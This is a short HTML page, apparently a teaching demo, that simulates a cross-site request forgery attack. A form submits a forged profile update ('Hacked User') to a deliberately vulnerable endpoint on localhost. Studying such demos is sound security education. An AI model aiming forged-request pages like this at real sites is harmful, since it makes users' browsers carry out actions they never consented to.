<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Simulation</title>
</head>
<body>
    <h1>Simulating a CSRF Attack</h1>
    <p>If CSRF protection is disabled, this form can submit data to the vulnerable endpoint without the user's consent.</p>
    <form action="http://127.0.0.1:8000/profile-vulnerable" method="POST">
        <input type="text" name="name" value="Hacked User">
        <button type="submit">Submit Malicious Request</button>
    </form>
</body>
</html>
